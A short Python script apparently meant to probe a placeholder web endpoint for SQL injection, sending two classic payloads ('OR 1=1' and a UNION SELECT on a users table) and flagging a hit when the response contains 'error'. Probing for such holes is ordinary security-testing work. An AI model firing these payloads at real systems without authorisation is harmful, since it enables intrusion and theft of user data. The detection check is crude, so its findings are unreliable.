# sql_injection.py
import requests

def test_sql_injection(url: str, payload: str) -> bool:
    response = requests.get(url, params={"input": payload})
    return "error" in response.text.lower()

def main():
    url = "https://example.com/vulnerable_endpoint"
    payloads = ["' OR 1=1 --", "' UNION SELECT * FROM users --"]

    for payload in payloads:
        if test_sql_injection(url, payload):
            print(f"SQL injection vulnerability found: {payload}")
            break

if __name__ == "__main__":
    main()
